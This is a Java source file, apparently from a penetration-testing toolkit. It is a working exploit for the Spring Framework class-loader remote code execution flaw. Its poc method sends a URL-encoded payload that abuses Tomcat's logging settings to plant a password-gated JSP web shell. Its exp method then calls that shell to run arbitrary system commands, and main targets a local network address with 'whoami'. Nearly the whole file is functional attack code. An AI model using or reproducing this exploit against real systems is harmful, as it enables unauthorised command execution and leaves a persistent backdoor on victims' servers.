package com.zjc.tools.poc.spring;

import com.zjc.tools.utils.http;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.HashMap;
import java.util.Map;

public class spring_rce {
    http http = new http();
    public   String  exp(String url,String cmd){
        InetSocketAddress addr = new InetSocketAddress("127.0.0.1", 8888);
        Proxy proxy = new Proxy(Proxy.Type.HTTP,addr);
        String cmd1 = "tomcatwar.jsp?pwd=j&cmd=" + cmd;
        String s = http.sendRequest(url+cmd1,"GET");
        String[] split = s.split("\\n");
        System.out.println(split[0]);

        return split[0];

    }
    public  String poc(String url) {
        String u="?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";
        String string = url + u;
        Map<String, String> headers = new HashMap<>();
        headers.put("suffix","%>//");
        headers.put("c1", "Runtime");
        headers.put("c2", "<%");
        headers.put("DNT", "1");
        headers.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");

        InetSocketAddress addr = new InetSocketAddress("127.0.0.1", 8888);
        Proxy proxy = new Proxy(Proxy.Type.HTTP,addr);
        String get = http.sendRequest(string, "GET",headers,proxy);
      System.out.println(get);
        return "";
    }


    public static void main(String[] args) {
        spring_rce spring_rce = new spring_rce();
        String s="http://192.168.199.229:8080/";
        spring_rce.exp(s,"whoami");
       // spring_rce.poc(s);
    }
}
